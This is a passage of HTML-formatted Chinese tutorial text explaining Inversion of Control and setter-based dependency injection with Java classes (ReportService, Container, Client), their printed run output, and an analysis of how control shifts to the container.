style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">消除上面的紧耦合关系，由容器取而代之</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;<span style=\"padding:0px; margin:0px\">private</span>&nbsp;ReportGenerator&nbsp;<span style=\"padding:0px; margin:0px\">generator</span>&nbsp;=\r\n (ReportGenerator)&nbsp;<span style=\"padding:0px; margin:0px\">Container</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .getBean(&quot;reportGenerator&quot;);</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">去除上面的</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">“</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">主动</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">”</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">查找，提供私有字段来保存外部注入的对象</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85); background:yellow\">private</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black; background:yellow\">&nbsp;ReportGenerator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192); background:yellow\">generator</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black; background:yellow\">;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体; background:yellow\">以</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">&nbsp;<span style=\"padding:0px; margin:0px\">setter</span>&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">方式从外部注入</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">void</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;setReportGenerator(ReportGenerator\r\n generator) {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">out</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.println(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;4...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">开始注入</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&nbsp;ReportGenerator\r\n ...&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85); background:yellow\">this</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black; background:yellow\">.</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192); background:yellow\">generator</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black; background:yellow\">&nbsp;=\r\n generator;</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">private</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Table&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">table</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;=&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">new</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Table();</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportService()\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">out</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.println(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;3...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">开始初始化</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&nbsp;ReportService\r\n ...&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">void</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;getDailyReport(Date\r\n date) {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">table</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.setDate(date);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">generator</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.generate(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">table</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">void</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;getMonthlyReport(Month\r\n month) {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">table</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.setMonth(month);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">generator</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.generate(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">table</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">}</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Client\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">static</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">void</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;main(String[]\r\n args) {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">初始化容器</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">new</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Container();</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ReportService reportService = (ReportService) Container</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .<span style=\"padding:0px; margin:0px\">getBean</span>(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;reportService&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reportService.getDailyReport(</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">new</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Date());</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">// reportService.getMonthlyReport(<span style=\"padding:0px; margin:0px\">new&nbsp;Date</span>());</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">}</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">运行结果：</span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">1...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">开始初始化</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Container\r\n ...</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">2...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">开始初始化</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;PDFGenerator\r\n ...</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">3...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">开始初始化</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportService\r\n ...</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">4...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">开始注入</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportGenerator\r\n ...</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">5...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">结束初始化</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Container\r\n ...</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">最后获取服务组件</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">...getBean() --&gt; reportService\r\n ...</span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">generate an PDF report ...</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">注意：</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:'Courier New'; color:black\">1</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、根据上面运行结果的打印顺序，可见代码中加入的具体编号是合理的，模拟了程序执行的流程，于是也就不再画序列图了。</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:'Courier New'; color:black\">2</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、注意该例子中对</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">IoC</span><span style=\"padding:0px; margin:0px; font-family:宋体\">、</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">DI</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">的使用，是以</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">ReportService</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">为客户端（即<span style=\"padding:0px; margin:0px; background:yellow\">组件需求者</span>）为基点的，而代码中的</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Client&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">类</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">main()</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">中的测试代码才是服务组件的最终用户，但它需要的不是组件，而是<span style=\"padding:0px; margin:0px; background:yellow\">组件所具有的服务</span>。</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:'Courier New'; color:black\">3</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、实际在</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Spring</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">框剪中，初始化</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Container</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">显然不是最终用户</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Client</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">应该做的事情，它应该由服务提供方事先启动就绪。</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:'Courier New'; color:black\">4</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、在最终用户</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Client</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">中，我们还是用到</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">Container.<span style=\"padding:0px; margin:0px\">getBean</span>(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;reportService&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">)</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">来获取事先已在</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Container</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">的构造函数中实例化好的服务组件。而在具体应用中，通常是<span style=\"padding:0px; margin:0px; background:yellow\">用</span></span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black; background:yellow\">XML</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体; background:yellow\">等配置文件将可用的服务组件部署到服务器</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">中，再由</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Container</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">读取该配置文件结合反射技术得以创建、注入具体的服务组件。</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">分析：</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">之前是由</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">ReportService</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">主动从</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Container</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">中请求获取服务组件，而现在是被动地等待</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Container</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">注入（</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Inject</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，也就是</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Push</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">）服务组件。控制权明显地由底层模块（</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">是组件需求者）转移给高层模块（</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Container&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">是组件提供者），也就是控制反转了。</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">回头看看上一篇文章吧</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:'Courier New'; color:black\">:-D</span><span 